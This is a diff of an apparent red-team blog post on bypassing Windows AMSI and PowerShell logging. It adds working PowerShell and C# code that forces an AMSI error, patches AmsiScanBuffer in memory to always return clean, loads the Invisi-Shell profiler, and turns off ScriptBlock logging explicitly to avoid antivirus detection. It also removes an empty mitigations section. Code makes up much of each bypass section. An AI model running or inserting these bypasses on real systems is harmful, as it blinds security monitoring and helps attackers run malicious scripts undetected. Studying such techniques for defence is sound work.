@@ -28,9 +28,55 @@ In fact, `amsi.dll` itself it's a userspace library and this has the consequence
 
 Check out [Omer Yair's talk](https://www.youtube.com/watch?v=Y3oMEiySxcc) about AMSI and [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell). [8] [9]
 
+The implementation of function `ScanContent` starts like this:
+
+```c#
+internal unsafe static AmsiUtils.AmsiNativeMethods.AMSI_RESULT ScanContent(string content, string sourceMetadata)
+{
+    if (string.IsNullOrEmpty(sourceMetadata))
+    {
+        sourceMetadata = string.Empty;
+    }
+
+    if (InternalTestHooks.UseDebugAmsiImplementation && content.IndexOf("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*", StringComparison.Ordinal) >= 0)
+    {
+        return AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED;
+    }
+
+    if (AmsiUtils.amsiInitFailed)
+    {
+        return AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_NOT_DETECTED;
+    }
+
+...
+# call to AmsiScanBuffer()
+...
+}
+```
+
+The code is pretty descriptive itself and we can already notice some important details:
+
+1. if the input is empty, `AMSI_RESULT_NOT_DETECTED` is returned to indicate that the sample is not considered malicious.
+
+1. `AMSI_RESULT_DETECTED` is returned when the content is considered malicious, as we can see from the string comparison with the [EICAR test file](https://en.wikipedia.org/wiki/EICAR_test_file).
+
+1. if the `amsiInitFailed` field is set, `AMSI_RESULT_NOT_DETECTED` is returned to indicate that the sample is not considered malicious.
+
+1. otherwise the function continues with its detection logic.
+
 ## Known Bypasses
 
 All the known bypasses are based on the fact that the AMSI DLL is loaded in the userspace.
+
+### Forcing an error
+
+If we are able to force an error inside AMSI, the protected field `amsiInitField` will be set and AMSI won't be called anymore.
+
+```powershell
+$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
+[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null)
+[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
+```
 
 ### Setting amsiInitFailed to $true
 
@@ -51,24 +97,23 @@ $field.SetValue($null,$true) # set it to `$true`
 Write-host -ForegroundColor green "AMSI won't be called anymore"
 ```
 
-### Patching AmsiScanString / AmsiScanBuffer
+### Patching AmsiScanBuffer
 
-It's also possible to _monkeypatch_ at runtime the `amsi.dll` code. In particular, interesting functions are `AmsiScanString` and `AmsiScanBuffer`. We can overwrite the logic of those function by making them always return `S_OK`, as when the command is allowed to run.
+It's also possible to _monkeypatch_ at runtime the `amsi.dll` code. In particular, we are interested in patching the function `AmsiScanBuffer`. We can overwrite the logic of this function by making them always return `S_OK`, as when the command is allowed to run.
 
 ![AMSI Patch](../assets/images/amsi-patch.png "AMSI Patch")
 
 In order to do that we can craft a malicious DLL to load at runtime that will patch on the fly the `amsi.dll` in our memory space. There are multiple versions of this specific bypass, I will report the latest `C#` version.
 
 ```powershell
-function Invoke-BypassAMSI2 {
-    # Add-Type writes *.cs on disk!!
-    $id = get-random;
-    $Ref = (
+# Add-Type writes *.cs on disk!!
+$id = get-random;
+$Ref = (
     "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
     "System.Runtime.InteropServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
-    );
+);
 
-    $Source = @"
+$Source = @"
 using System;
 using System.Runtime.InteropServices;
 namespace Bypass
@@ -97,7 +142,7 @@ namespace Bypass
             UIntPtr size = (UIntPtr)5;
             uint p = 0;
             VirtualProtect(Address, size, 0x40, out p);
-            byte c1=0xB8,c2=0x80;			 
+            byte c1=0xB8,c2=0x80;
             Byte[] Patch = {c1, 0x57, 0x00, 0x07, c2, 0xC3 };
             IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
             Marshal.Copy(Patch, 0, unmanagedPointer, 6);
@@ -108,9 +153,9 @@ namespace Bypass
 }
 "@;
 
-    Add-Type -ReferencedAssemblies $Ref -TypeDefinition $Source -Language CSharp;
-    iex "[Bypass.AMSI$id]::Disable() | Out-Null"
-}
+Add-Type -ReferencedAssemblies $Ref -TypeDefinition $Source -Language CSharp;
+iex "[Bypass.AMSI$id]::Disable() | Out-Null"
+Write-host -ForegroundColor green "AMSI won't be called anymore"
 ```
 
 Be aware that using `Add-Type` to compile on the fly `C#` in PowerShell code will touch the disk, dropping some `*.cs` to a temporary directory during the compilation phase.
@@ -118,19 +163,23 @@ Be aware that using `Add-Type` to compile on the fly `C#` in PowerShell code wil
 ### Hooking .NET Framework via CLR
 
 Another powerful technique is based on hooking at runtime the .NET Framework via CLR Profiler API, as seen in [Invisi-Shell](https://github.com/OmerYa/Invisi-Shell) by Omer Yiar.
-This project is able to bypass all the protection mechanisms of PowerShell, that are Script Block Log, Module Logging, Transcription and AMSI and it was inspired by Amanda Rousseau's [Hijacking .NET to Defend PowerShell](https://arxiv.org/abs/1709.07508) paper.
-Using CLR Profiler APIs, `Invisi-Shell` is able to hook .NET assemblies and disable any kind of protection mechanisms. The only downside of this techinique is that you have to drop a DLL on disk, in order to be loaded by the CLR Profiler APIs. There are two ways of loading the DLL:
+This project is able to bypass all the protection mechanisms of PowerShell, that are Script Block Log, Module Logging, Transcription and AMSI.
+Using CLR Profiler APIs, `Invisi-Shell` is able to hook .NET assemblies [10] and disable any kind of protection mechanisms by always overwriting the input length attribute with `0`. As we saw above, if the input is empty, `AMSI_RESULT_NOT_DETECTED` will be returned and the same logic applies to every other security mechanisms.
+The only downside of this techinique is that you have to drop a DLL on disk, in order to be loaded by the CLR Profiler APIs. There are two ways of loading the DLL:
 
 1. via ENV variables (**admin required**)
-```
+
+```cmd
 set COR_ENABLE_PROFILING=1
 set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
 set COR_PROFILER_PATH=%~dp0InvisiShellProfiler.dll
 
 powershell
 ```
+
 2. via the Registry (**any user**)
-```
+
+```cmd
 set COR_ENABLE_PROFILING=1
 set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
 
@@ -157,28 +206,26 @@ We need to do two things in order to do that:
 First of all, in order to avoid to be detected after having disabled AMSI, we need to be sure that no logs of our commands are saved on disk, otherwise the AV will spot our activity. There is a public known bypass to disable the built-in `ScriptBlockLog` mechanism of PowerShell.
 
 ```powershell
-function Invoke-BypassScriptBlockLog {
-    $GPF=[ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','N'+'onPublic,Static');
-    If($GPF){
-        $GPC=$GPF.GetValue($null);
-        If($GPC['ScriptB'+'lockLogging']){
-            $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;
-            $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockInvocationLogging']=0
-        }
-        $val=[Collections.Generic.Dictionary[string,System.Object]]::new();
-        $val.Add('EnableScriptB'+'lockLogging',0);
-        $val.Add('EnableScriptB'+'lockInvocationLogging',0);
-        $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$val
-    } Else {
-        [ScriptBlock].GetField('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
+$GPF=[ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','N'+'onPublic,Static');
+If($GPF){
+    $GPC=$GPF.GetValue($null);
+    If($GPC['ScriptB'+'lockLogging']){
+        $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;
+        $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockInvocationLogging']=0
     }
+    $val=[Collections.Generic.Dictionary[string,System.Object]]::new();
+    $val.Add('EnableScriptB'+'lockLogging',0);
+    $val.Add('EnableScriptB'+'lockInvocationLogging',0);
+    $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$val
+} Else {
+    [ScriptBlock].GetField('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
 }
 ```
 
 It works by doing two things:
 
 1. disable global logging of scripts: if Domain Admins enable global logging of scripts, every script will be recorded on disk. To disable it we just overwrite the in memory representation of the Group Policy Settings.
-2. replace the dictionary of known signatures with an empty one: some signatures trigger always a log action, even if the Script Block Logging mechanism is not enabled via Group Policy (_sic!_). In order to disable it, we replace this dictionary of known signatures with an empty one, always in our memory space.
+2. replace the dictionary of known signatures with an empty one: some signatures always trigger a log action, even if the Script Block Logging mechanism is not enabled via Group Policy (_sic!_). In order to disable it, we replace this dictionary of known signatures with an empty one, always in our memory space.
 
 ### Meterpreter
 
@@ -186,13 +233,6 @@ _TODO_
 
 [PR](https://github.com/rapid7/rex-powershell/pull/17)
 
-## Mitigations
-
-Let's analyze some possible mitigations.
-
-### ConstrainedMode for PowerShell
-
-### Disable spawning PowerShell from Office products (Process Hollowing)
 
 ## References
 
@@ -205,10 +245,12 @@ Let's analyze some possible mitigations.
 7. [https://rastamouse.me/2018/11/amsiscanbuffer-bypass-part-3/](https://rastamouse.me/2018/11/amsiscanbuffer-bypass-part-3/)
 8. [https://github.com/OmerYa/Invisi-Shell](https://github.com/OmerYa/Invisi-Shell)
 9. [https://www.youtube.com/watch?v=Y3oMEiySxcc](https://www.youtube.com/watch?v=Y3oMEiySxcc)
-10. [https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
-11. [https://github.com/d0nkeys/redteam/blob/master/code-execution/Invoke-Bypass.ps1](https://github.com/d0nkeys/redteam/blob/master/code-execution/Invoke-Bypass.ps1)
-12. [https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)
-13. [https://www.youtube.com/watch?v=rEFyalXfQWk](https://www.youtube.com/watch?v=rEFyalXfQWk)
-14. [https://github.com/OmerYa/Babel-Shellfish](https://github.com/OmerYa/Babel-Shellfish)
+10. [https://arxiv.org/abs/1709.07508](https://arxiv.org/abs/1709.07508)
+11. [https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
+12. [https://github.com/d0nkeys/redteam/blob/master/code-execution/Invoke-Bypass.ps1](https://github.com/d0nkeys/redteam/blob/master/code-execution/Invoke-Bypass.ps1)
+13. [https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)
+14. [https://www.youtube.com/watch?v=rEFyalXfQWk](https://www.youtube.com/watch?v=rEFyalXfQWk)
+15. [https://github.com/OmerYa/Babel-Shellfish](https://github.com/OmerYa/Babel-Shellfish)
+16. [https://en.wikipedia.org/wiki/EICAR_test_file](https://en.wikipedia.org/wiki/EICAR_test_file)
 
 [back](../)
